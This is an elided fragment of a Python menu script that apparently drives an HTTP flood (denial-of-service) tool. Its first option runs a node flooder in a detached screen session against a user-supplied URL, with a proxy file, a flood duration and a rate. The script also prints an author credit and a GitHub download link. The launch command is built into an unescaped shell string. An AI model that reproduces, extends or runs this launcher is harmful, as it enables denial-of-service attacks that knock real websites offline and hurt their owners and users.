		...
		while True:
			...
			if option == '01' or option == '1':
				try:
					...
					subprocess.run([f'screen -dm node vdh/PEM/https1 GET {url} utils/http.txt {floodtime} 64 1'], shell=True)
					print(Color.LG+f"\n Vi Đức Hùng: Done!\n")
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option == '02' or option == '2':
...
def main(): 
	...
	try:
		...
		print("\n[+] Please download on GitHub, or git clone: https://github.com/Viduchung/vdh.git\n")
